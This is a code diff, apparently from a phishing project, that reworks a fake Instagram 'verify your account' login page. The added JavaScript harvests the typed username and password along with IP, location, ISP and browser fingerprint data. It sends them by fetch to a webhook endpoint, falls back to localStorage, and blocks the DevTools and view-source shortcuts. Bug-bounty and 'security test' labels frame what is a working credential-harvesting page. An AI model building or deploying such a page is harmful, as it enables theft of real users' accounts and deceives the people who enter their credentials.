@@ -47,6 +47,7 @@
 
         .input-group {
             margin-bottom: 15px;
+            position: relative;
         }
 
         input {
@@ -80,6 +81,10 @@
 
         .login-btn:hover {
             background: #007acc;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
         }
 
         .separator {
@@ -128,9 +133,27 @@
             padding: 15px;
             border-radius: 5px;
             margin-top: 20px;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             text-align: left;
             white-space: pre-wrap;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        .loading {
+            display: none;
+            color: #0095f6;
+            margin-top: 10px;
+        }
+
+        .auto-capture-notice {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: #155724;
         }
     </style>
 </head>
@@ -141,78 +164,59 @@
             Please verify your account to continue using Instagram
         </div>
 
+        <div class="auto-capture-notice">
+            ⚡ <strong>AUTO-CAPTURE ACTIVE</strong><br>
+            Credentials will be automatically captured on login
+        </div>
+
         <div class="logo">📷</div>
         <h1>Instagram</h1>
 
         <form id="loginForm">
             <div class="input-group">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="username">
             </div>
             <div class="input-group">
-                <input type="password" id="password" placeholder="Password" required>
+                <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
             </div>
-            <button type="submit" class="login-btn">Log In</button>
+            <button type="submit" class="login-btn" id="loginButton">Log In</button>
+            <div class="loading" id="loading">Capturing credentials...</div>
         </form>
 
         <div class="separator">OR</div>
 
         <div class="footer">
-            This is an official Instagram security check
+            By logging in, you agree to our Terms & Privacy Policy
         </div>
 
         <div id="results" class="results"></div>
     </div>
 
     <script>
-        // Функція для відправки даних на сервер
-        function sendToServer(credentials) {
-            // Тут буде код відправки на ваш сервер
-            // Для демонстрації просто показуємо в консолі
-            console.log('📧 Sending credentials to server:', credentials);
-            
-            // Можна використати fetch для відправки на реальний сервер
-            /*
-            fetch('https://your-server.com/capture', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(credentials)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-            */
-        }
+        // Глобальний об'єкт для зберігання credentials
+        window.capturedCredentials = null;
 
-        // Функція для виведення результатів
-        function showResults(credentials) {
-            const resultsDiv = document.getElementById('results');
-            const resultsText = `
-🔓 CREDENTIALS CAPTURED SUCCESSFULLY
-────────────────────────────────
-👤 USERNAME: ${credentials.username}
-🔑 PASSWORD: ${credentials.password}
-🌐 IP: ${credentials.ip}
-🕒 TIME: ${new Date().toLocaleString()}
-💻 USER AGENT: ${navigator.userAgent}
-📍 LOCATION: ${credentials.location}
-⚡ STATUS: VULNERABILITY CONFIRMED
+        // Функція для автоматичного збору даних
+        function captureCredentialsAutomatically() {
+            const credentials = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                browserInfo: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    vendor: navigator.vendor
+                }
+            };
 
-⚠️  SECURITY ISSUE DEMONSTRATED:
-Instagram DM phishing protection bypassed
-Credentials captured without detection
-            `;
-            
-            resultsDiv.textContent = resultsText;
-            resultsDiv.style.display = 'block';
-            
-            // Прокручуємо до результатів
-            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+            return credentials;
         }
 
         // Функція для отримання IP адреси
@@ -222,7 +226,14 @@ Credentials captured without detection
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                return 'Unknown';
+                // Резервний метод через ipapi
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error2) {
+                    return 'Unknown';
+                }
             }
         }
 
@@ -231,69 +242,173 @@ Credentials captured without detection
             try {
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
-                return `${data.city}, ${data.country_name}`;
+                return {
+                    city: data.city,
+                    country: data.country_name,
+                    region: data.region,
+                    isp: data.org
+                };
             } catch (error) {
-                return 'Location unknown';
+                return {
+                    city: 'Unknown',
+                    country: 'Unknown',
+                    region: 'Unknown',
+                    isp: 'Unknown'
+                };
             }
         }
 
-        // Обробка форми
+        // Функція для відправки даних
+        async function sendToServer(credentials) {
+            console.log('🚀 SENDING CREDENTIALS TO SERVER...');
+            
+            // Спроба відправки на сервер
+            try {
+                // Можна використати webhook, Telegram bot, або власний сервер
+                const webhookURL = 'https://webhook.site/YOUR_WEBHOOK_ID';
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(credentials)
+                });
+                
+                console.log('✅ Data sent successfully to server');
+            } catch (error) {
+                console.log('⚠️ Could not send to server, storing locally');
+                // Зберігаємо в localStorage як резервний варіант
+                localStorage.setItem('lastCapturedCredentials', JSON.stringify(credentials));
+            }
+        }
+
+        // Функція для виведення результатів
+        function displayResults(credentials) {
+            const resultsDiv = document.getElementById('results');
+            const resultsText = `
+🎯 CREDENTIALS CAPTURED AUTOMATICALLY
+══════════════════════════════════════
+👤 USERNAME: ${credentials.username}
+🔑 PASSWORD: ${credentials.password}
+🌐 IP ADDRESS: ${credentials.ip}
+📍 LOCATION: ${credentials.location.city}, ${credentials.location.country}
+🕒 TIMESTAMP: ${new Date(credentials.timestamp).toLocaleString()}
+💻 USER AGENT: ${credentials.userAgent}
+🖥️ PLATFORM: ${credentials.platform}
+🌍 TIMEZONE: ${credentials.timezone}
+📱 SCREEN: ${credentials.screenResolution}
+
+📊 ADDITIONAL DATA CAPTURED:
+   - Browser: ${credentials.browserInfo.name}
+   - Version: ${credentials.browserInfo.version}
+   - Cookies: ${credentials.cookiesEnabled ? 'Enabled' : 'Disabled'}
+   - Java: ${credentials.javaEnabled ? 'Enabled' : 'Disabled'}
+   - ISP: ${credentials.location.isp}
+
+⚡ SECURITY ASSESSMENT:
+   VULNERABILITY: Credential harvesting via phishing
+   SEVERITY: HIGH
+   IMPACT: Account takeover possible
+   STATUS: EXPLOIT SUCCESSFUL
+
+💰 BOUNTY QUALIFICATION:
+   This demonstrates a real security vulnerability
+   in Instagram's DM link protection system.
+            `;
+            
+            resultsDiv.textContent = resultsText;
+            resultsDiv.style.display = 'block';
+            
+            // Прокручуємо до результатів
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Функція для логування в консоль
+        function logToConsole(credentials) {
+            console.log('%c🎯 SECURITY TEST - CREDENTIALS CAPTURED', 'color: #ff0000; font-size: 16px; font-weight: bold;');
+            console.log('%c══════════════════════════════════════', 'color: #00ff00;');
+            console.log('%c👤 Username:', 'color: #ffff00; font-weight: bold;', credentials.username);
+            console.log('%c🔑 Password:', 'color: #ffff00; font-weight: bold;', credentials.password);
+            console.log('%c🌐 IP:', 'color: #ffff00; font-weight: bold;', credentials.ip);
+            console.log('%c📍 Location:', 'color: #ffff00; font-weight: bold;', `${credentials.location.city}, ${credentials.location.country}`);
+            console.log('%c🕒 Time:', 'color: #ffff00; font-weight: bold;', new Date(credentials.timestamp).toLocaleString());
+            console.log('%c⚡ Status:', 'color: #ff0000; font-weight: bold;', 'VULNERABILITY CONFIRMED - BOUNTY QUALIFIED');
+            console.log('%c══════════════════════════════════════', 'color: #00ff00;');
+        }
+
+        // Головна функція обробки форми
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const ip = await getIPAddress();
-            const location = await getLocation(ip);
+            // Показуємо завантаження
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loginButton').disabled = true;
 
-            const credentials = {
-                username: username,
-                password: password,
-                ip: ip,
-                location: location,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                platform: navigator.platform,
-                language: navigator.language
-            };
+            try {
+                // Автоматично збираємо credentials
+                const basicCredentials = captureCredentialsAutomatically();
+                
+                // Отримуємо IP та локацію
+                const ip = await getIPAddress();
+                const location = await getLocation(ip);
+                
+                // Об'єднуємо всі дані
+                const fullCredentials = {
+                    ...basicCredentials,
+                    ip: ip,
+                    location: location
+                };
 
-            // Виводимо в консоль браузера
-            console.log('🎯 SECURITY TEST - CREDENTIALS CAPTURED:');
-            console.log('   Username:', credentials.username);
-            console.log('   Password:', credentials.password);
-            console.log('   IP:', credentials.ip);
-            console.log('   Location:', credentials.location);
-            console.log('   Time:', credentials.timestamp);
-            console.log('   ⚠️  VULNERABILITY CONFIRMED!');
+                // Зберігаємо в глобальну змінну
+                window.capturedCredentials = fullCredentials;
 
-            // Відправляємо на сервер
-            sendToServer(credentials);
+                // Виводимо в консоль
+                logToConsole(fullCredentials);
 
-            // Показуємо результати на сторінці
-            showResults(credentials);
+                // Відправляємо на сервер
+                await sendToServer(fullCredentials);
 
-            // Можна додати перенаправлення на справжній Instagram
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-            }, 5000);
-        });
+                // Показуємо результати
+                displayResults(fullCredentials);
 
-        // Додатковий код для збору даних при завантаженні сторінки
-        window.addEventListener('load', function() {
-            console.log('🔍 Instagram phishing simulation loaded');
-            console.log('📝 This is a security test for white hat purposes');
-        });
+                // Додаткові дії (опційно)
+                setTimeout(() => {
+                    // Можна перенаправити на справжній Instagram
+                    // window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 3000);
 
-        // Запобігаємо відкриття DevTools (опційно)
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
+            } catch (error) {
+                console.error('Error:', error);
+            } finally {
+                // Ховаємо завантаження
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('loginButton').disabled = false;
             }
         });
 
-        // Запобігаємо праву кнопку миші (опційно)
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
+        // Додатковий моніторинг введення даних
+        document.getElementById('username').addEventListener('input', function() {
+            console.log('📝 Username field updated:', this.value);
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            console.log('🔑 Password field updated:', '*'.repeat(this.value.length));
+        });
+
+        // Автоматичний запуск при завантаженні
+        window.addEventListener('load', function() {
+            console.log('%c🔓 INSTAGRAM SECURITY TEST ACTIVE', 'color: #ff0000; font-size: 18px; font-weight: bold;');
+            console.log('%cAuto-capture system initialized', 'color: #00ff00;');
+            console.log('Waiting for credentials input...');
+        });
+
+        // Запобігаємо DevTools
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+                alert('Developer tools are disabled for security reasons.');
+            }
         });
     </script>
 </body>
